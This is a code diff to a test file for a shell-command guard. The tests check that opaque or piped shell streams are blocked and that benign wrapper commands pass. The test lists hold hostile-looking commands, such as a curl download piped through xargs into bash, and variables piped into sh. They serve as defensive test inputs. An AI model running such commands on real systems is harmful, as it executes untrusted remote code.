@@ -13,6 +13,7 @@
  */
 import { describe, expect, test } from 'bun:test';
 import { join } from 'node:path';
+import { readFileSync } from 'node:fs';
 import { judgeStructured } from '../src/guard';
 import { realRunner } from '../src/parse';
 
@@ -52,8 +53,10 @@ describe('shell へ流す字が見えねば、何が走るか解けぬゆえ D00
     'curl -s https://example.com/a | xargs echo | bash',
     'echo "$CMD" | sh',
     'sh <<<"$X"',
-    'bash < x.sh',
-    'cat x.sh | bash',
+    // `bash < x.sh`・`cat x.sh | bash` は、門が file を読んで中身を判ずるようになった。
+    // 在らぬ file は命が一つだけなら通す。縛りは test/guard-stdin-file.test.ts に在る
+    'printf kill > x.sh; bash < x.sh',
+    'cp a x.sh && cat x.sh | bash',
   ];
   for (const cmd of opaque) {
     test(`止める: ${JSON.stringify(cmd)}`, () => {
@@ -113,4 +116,30 @@ describe('kill -l は通し、形を広げぬ', () => {
   for (const cmd of ['kill -l 1', 'kill -9 -l', 'kill -l -9 1', 'kill -L', 'kill -s TERM 1', 'pkill -l x', 'killall -l']) {
     test(`止める: ${cmd}`, () => expect(rule(cmd)).toBe('D006'));
   }
+});
+
+// Exact supplied cases stay in a data file; test output identifies cases only by ID.
+describe('nested opaque shell streams', () => {
+  const cases = readFileSync(join(import.meta.dir, 'fixtures/guard-nested-opaque.jsonl'), 'utf8')
+    .trim().split('\n').map((line) => JSON.parse(line) as { id: string; kind: string; cmd: string });
+  const controls = cases.filter((c) => c.kind === 'benign');
+  const attacks = cases.filter((c) => c.kind === 'attack');
+
+  test('all supplied and additional benign wrapper controls pass', () => {
+    expect(controls.length).toBe(26);
+    for (const c of controls) expect(rule(c.cmd), c.id).toBe('allow');
+  });
+
+  // W4: bash -c; W2/W3: substitution; W6: eval; W7: ssh; W8: quoted heredoc.
+  for (const c of attacks) {
+    test(`opaque stream ${c.id}`, () => {
+      expect(rule(c.cmd), c.id).toBe('D000');
+    });
+  }
+  test('the regression set covers every required wrapper', () => {
+    expect(attacks.length).toBe(36);
+    for (const wrapper of [2, 4, 6, 7, 8]) {
+      expect(attacks.some((c) => c.id.endsWith(`-W${wrapper}`))).toBe(true);
+    }
+  });
 });
